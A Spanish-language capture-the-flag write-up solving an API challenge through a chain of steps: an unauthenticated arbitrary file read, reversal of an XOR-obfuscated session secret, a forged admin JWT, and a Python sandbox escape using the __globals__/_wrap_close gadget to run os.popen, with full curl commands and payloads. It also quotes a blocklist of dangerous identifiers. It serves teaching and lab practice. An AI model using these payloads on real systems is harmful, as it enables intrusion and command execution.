
![[Pasted image 20260704161604.png]]

**Categoría:** API · **Dificultad:** Hard · **Puntos:** 130

> FlowForge automatiza tus workflows. Instancia recién desplegada, con código fuente incluido, docs en `/api/docs`. La flag está en algún lugar del sistema de archivos del servidor.

Esta guía resuelve el reto **a mano**, comando por comando, sin usar ningún script automatizado. Cada paso explica qué se hizo, con qué comando, y **por qué** se sabía que era el camino correcto.

Se asume `BASE_URL` = la dirección de tu instancia desplegada, por ejemplo:

```bash
export BASE_URL="https://<tu-instancia>.chal.ctf.ae"
```

---

## Paso 0 — Reconocimiento: leer el código fuente

Antes de tocar la API, se leyó `app.py` completo (viene adjunto en el reto) y se clasificaron los 10 endpoints según dos preguntas: **¿pide autenticación?** y **¿realmente hace algo peligroso con la entrada del usuario?**

|Endpoint|Auth|¿Toca algo peligroso?|
|---|---|---|
|`GET /api/health`|No|Solo devuelve estado + timestamp de arranque|
|`GET /api/docs`|No|Solo documentación|
|`POST /api/webhooks/trigger`|**No**|**`open(fpath)` sobre una ruta enviada por el usuario** ⚠️|
|`POST /api/auth/verify`|No (recibe token como parámetro)|Verifica firma JWT|
|`POST /api/workflows/debug`|Sí (cualquier rol)|Ejecuta `shlex.quote()` + lista blanca — no ejecuta nada real|
|`POST /api/notifications/preview`|Sí (cualquier rol)|Reemplaza placeholders con regex estricta — no hay motor de plantillas|
|`POST /api/workflows/import`|Sí (**admin**)|Valida tipos y longitudes, no ejecuta nada|
|`POST /api/workflows/evaluate`|Sí (**admin**)|**`exec()` de código Python del usuario** ⚠️|
|`GET /api/workflows`|Sí (**admin**)|Solo lista datos estáticos|
|`GET /api/system/info`|Sí (**admin**)|Solo info estática|

**Conclusión del reconocimiento:** solo dos endpoints tocan algo realmente peligroso (`open()` y `exec()`). Uno de ellos (`/api/webhooks/trigger`) no pide ninguna autenticación — ahí se empezó.

---

## Paso 1 — Filtrar el archivo de configuración interno sin autenticarse

### 1.1 Ver qué protege realmente el endpoint

```python
@app.route("/api/webhooks/trigger", methods=["POST"])
def webhook_trigger():
    body = request.get_json(silent=True)
    ...
    fpath = os.path.normpath(fpath)
    if not any(fpath.endswith(ext) for ext in ALLOWED_FILE_EXTENSIONS):
        # rechaza
    with open(fpath, "r") as f:
        content = f.read(4096)
```

**Por qué se identificó como explotable:**

- No hay ninguna llamada a `verify_admin_token()` ni `verify_any_token()` en toda la función — el único filtro es la extensión del archivo.
- `os.path.normpath()` solo colapsa cosas como `a/../b` → `b`; **no restringe a ningún directorio base**. Una ruta absoluta como `/app/.internal/config.json` pasa el filtro sin problema porque termina en `.json`.

### 1.2 Encontrar la ruta del archivo a leer

En el `Dockerfile` del reto:

```dockerfile
RUN useradd -m -s /bin/bash flowforge && \
    mkdir -p /app/.internal && \
    chown -R flowforge:flowforge /app
```

Y en `app.py`, dentro de `init_app()`:

```python
config_path = os.path.join(internal_dir, "config.json")  # internal_dir = "/app/.internal"
```

Es decir: el archivo interesante está en `/app/.internal/config.json`.

### 1.3 Ejecutar la petición

```bash
curl -sk -X POST "$BASE_URL/api/webhooks/trigger" \
  -H "Content-Type: application/json" \
  -d '{
    "workflow_id": "recon",
    "files": [{"path": "/app/.internal/config.json"}]
  }'
```

**Respuesta esperada:**

```json
{
  "workflow_id": "recon",
  "status": "triggered",
  "file_metadata": [
    {
      "path": "/app/.internal/config.json",
      "metadata": {
        "size": 123,
        "preview": "{\n  \"session_secret\": \"413b27c9...\",\n  \"version\": \"2.1.0\"\n}"
      }
    }
  ]
}
```

Guarda el valor de `session_secret` (es hexadecimal) — lo necesitas en el paso 2.

---

## Paso 2 — Recuperar el `SESSION_SECRET` real (romper la ofuscación XOR)

### 2.1 Entender cómo se "cifró"

En `init_app()`:

```python
BOOT_TIMESTAMP = int(time.time())            # segundos Unix al arrancar
SESSION_SECRET = os.urandom(24).hex()        # 48 caracteres hex — la clave JWT REAL
ts_hash = hashlib.sha256(str(BOOT_TIMESTAMP).encode()).digest()   # 32 bytes
xor_key = ts_hash[: len(SESSION_SECRET)]     # pide 48 bytes, pero ts_hash solo tiene 32
XOR_ENCODED_SECRET = xor_bytes(SESSION_SECRET.encode(), xor_key).hex()
```

**Por qué esto no es cifrado, es ofuscación reversible:**

- XOR con una clave conocida (o deducible) es trivialmente invertible: `A = B XOR K` implica `B = A XOR K`.
- La "clave" (`xor_key`) no es secreta de verdad: se deriva 100% de `BOOT_TIMESTAMP`, un número entero de segundos.
- `xor_bytes()` recicla la clave en ciclo (`key[i % len(key)]`), así que aunque pidan 48 bytes y `ts_hash` solo tenga 32, la función simplemente repite los primeros bytes — no rompe nada, solo hay que replicar el mismo ciclo al revertir.

### 2.2 Conseguir `BOOT_TIMESTAMP` (es público)

```bash
curl -sk "$BASE_URL/api/health"
```

```json
{"status": "ok", "started_at": 1783202674, "version": "2.1.0", "uptime_seconds": 812}
```

`started_at` **es** `BOOT_TIMESTAMP`. No hace falta ningún exploit para esto — el propio endpoint de salud lo expone sin autenticación.

### 2.3 Revertir el XOR a mano

Aquí sí se necesita un cálculo (SHA-256 + XOR), pero se hace en una sola línea de Python interactivo, no un script:

```bash
python3 -c "
import hashlib
boot_ts = 1783202674                                    # el 'started_at' del paso 2.2
encoded = bytes.fromhex('413b27c9663c92186ef23ef040541d65ae76603f353e3cb5f9a3d665d408faec153b7293306e934c63f53afa45521d61')  # session_secret del paso 1.3

ts_hash = hashlib.sha256(str(boot_ts).encode()).digest()  # 32 bytes, reproducimos xor_key
secret = bytes(b ^ ts_hash[i % len(ts_hash)] for i, b in enumerate(encoded))
print(secret.decode())
"
```

**Salida:** el `SESSION_SECRET` en texto plano, 48 caracteres hex (por ejemplo `f2a92f6f8b79c16e2e6d9bf99273f757224cd4725e33f76a`).

**Cómo se confirmó que estaba bien:** se usó para forjar un JWT (paso 3) y se validó contra `/api/auth/verify`, que internamente hace `jwt.decode(token, SESSION_SECRET, algorithms=["HS256"])`. HMAC-SHA256 es una firma criptográfica: si el secreto estuviera mal, la verificación fallaría con `InvalidTokenError` sin excepción. Que devolviera `"valid": true` fue la prueba de que el secreto recuperado era exacto.

---

## Paso 3 — Forjar un JWT con rol `admin`

### 3.1 Por qué esto es posible

```python
def verify_admin_token():
    ...
    payload = jwt.decode(token, SESSION_SECRET, algorithms=["HS256"])
    if payload.get("role") == "admin":
        return payload
```

El servidor solo verifica **la firma** del JWT contra `SESSION_SECRET`. No hay ninguna otra validación (emisor, audiencia, lista de usuarios admin conocidos, etc.). Si tenemos el secreto, podemos firmar **cualquier payload que queramos**, incluyendo `role: admin`.

### 3.2 Generar el token

```bash
python3 -c "
import jwt
secret = 'f2a92f6f8b79c16e2e6d9bf99273f757224cd4725e33f76a'   # el recuperado en el paso 2.3
token = jwt.encode({'user': 'pwn', 'role': 'admin'}, secret, algorithm='HS256')
print(token)
"
```

Guarda el token generado.

### 3.3 Confirmar que el servidor lo acepta

```bash
curl -sk -X POST "$BASE_URL/api/auth/verify" \
  -H "Content-Type: application/json" \
  -d "{\"token\": \"$TOKEN\"}"
```

```json
{"valid": true, "user": "pwn", "role": "admin"}
```

Con esto ya tenemos acceso admin completo a la API sin haber tenido nunca credenciales legítimas.

---

## Paso 4 — Escapar del "sandbox" de `/api/workflows/evaluate`

### 4.1 Entender el filtro

```python
BLOCKED_PATTERNS = [
    r"\bos\b", r"\bsubprocess\b", r"\b__import__\b", r"\bimport\b",
    r"\bopen\b", r"\beval\b", r"\bexec\b", r"\bcompile\b",
    r"\bglobals\b", r"\blocals\b", r"\bbreakpoint\b", r"\binput\b",
]
...
for pattern in BLOCKED_PATTERNS:
    if re.search(pattern, expression):
        return error, 400
exec(compile(expression, "<sandbox>", "exec"), restricted_globals, restricted_locals)
```

**El detalle que rompe todo el filtro:** cada patrón usa `\b` (límite de palabra) en ambos extremos. En regex, `\b` marca una frontera entre un carácter "de palabra" (letras, dígitos, `_`) y uno que no lo es. El guion bajo **cuenta como carácter de palabra**. Por eso, en la cadena `__globals__`, la subcadena `globals` está pegada a guiones bajos por los dos lados, y **no hay ninguna frontera de palabra ahí** — `\bglobals\b` simplemente no la detecta.

El filtro bloquea el identificador `globals` (la función builtin), pero no el atributo especial `__globals__`, que expone exactamente el mismo tipo de acceso peligroso (el diccionario de variables globales de cualquier función).

### 4.2 Construir el payload de escape

Técnica clásica de escape de sandboxes en Python: recorrer todas las subclases de `object` para encontrar una clase interna definida dentro del módulo `os`, y usar su `__globals__` para llegar a `os.popen` sin escribir jamás la palabra `os`:

```python
subclasses = ().__class__.__base__.__subclasses__()
wrap_close = [c for c in subclasses if c.__name__ == '_wrap_close'][0]
popen = wrap_close.__init__.__globals__['popen']
print(popen('cat /flag_*.txt').read())
```

**Por qué `_wrap_close` específicamente:** es una clase que CPython define dentro del propio módulo `os.py`, usada internamente por `os.popen()` para envolver el subproceso. Al acceder a `wrap_close.__init__.__globals__`, se obtiene el diccionario completo de variables globales del módulo donde fue definida esa clase — es decir, el namespace del módulo `os`, que incluye la función `popen` bajo la clave `'popen'`. Ninguna palabra prohibida (`os`, `import`, `eval`, etc.) aparece en el código: `os` nunca se escribe como texto, solo se llega a él indirectamente vía introspección de clases.

### 4.3 Encontrar el nombre exacto del archivo de flag

En `entrypoint.sh` (adjunto en el reto):

```bash
FLAG_RAND=$(head -c 8 /dev/urandom | xxd -p)
FLAG_FILE="/flag_${FLAG_RAND}.txt"
```

El patrón siempre es `/flag_XXXXXXXX.txt` en la raíz del sistema de archivos — de ahí el glob `/flag_*.txt` usado en el paso anterior, sin necesidad de listar el directorio primero.

### 4.4 Ejecutar la petición

Con el JWT de admin del paso 3:

```bash
curl -sk -X POST "$BASE_URL/api/workflows/evaluate" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "expression": "subclasses = ().__class__.__base__.__subclasses__()\nwrap_close = [c for c in subclasses if c.__name__ == \"_wrap_close\"][0]\npopen = wrap_close.__init__.__globals__[\"popen\"]\nprint(popen(\"cat /flag_*.txt\").read())"
  }'
```

**Respuesta:**

```json
{
  "result": "flag{2905ddb88d9b7cfa}",
  "variables": {"...": "..."}
}
```

🚩 **Flag: `flag{2905ddb88d9b7cfa}`**

---

## Resumen de la cadena completa

```
1. POST /api/webhooks/trigger (sin auth)
      └─ lee /app/.internal/config.json  →  session_secret (ofuscado)

2. GET /api/health (sin auth)
      └─ started_at  →  permite recalcular la clave XOR

3. XOR inverso (local)
      └─ session_secret ofuscado  →  SESSION_SECRET real

4. Forjar JWT firmado con SESSION_SECRET, role=admin
      └─ confirmado válido en /api/auth/verify

5. POST /api/workflows/evaluate (con JWT admin)
      └─ gadget __globals__ → os.popen → cat /flag_*.txt
      └─ FLAG
```

## Por qué funcionó cada paso (síntesis)

|Paso|Causa raíz explotada|
|---|---|
|1|Endpoint que toca el disco sin verificar autenticación ni confinar el directorio, solo la extensión|
|2|"Cifrado" implementado como XOR con clave derivada de un dato público (timestamp de arranque)|
|3|El servidor confía ciegamente en cualquier JWT firmado con el secreto correcto, sin más controles de autorización|
|4|Sandbox de Python basado en lista negra de _palabras_, cuando el verdadero problema son las _capacidades_ del lenguaje (introspección de objetos), que ninguna lista de palabras cubre por completo|

## Lección general

El patrón de fondo en los tres pasos es el mismo: **controles que parecen seguridad real pero que solo cubren la superficie** — una extensión de archivo en vez de una ruta confinada, una ofuscación reversible en vez de cifrado, y una lista de palabras prohibidas en vez de una lista blanca de operaciones permitidas. La forma de encontrar la cadena completa fue leer, endpoint por endpoint, **qué validación existe justo antes de la operación peligrosa** — no asumir que existe por el nombre de la función o del endpoint.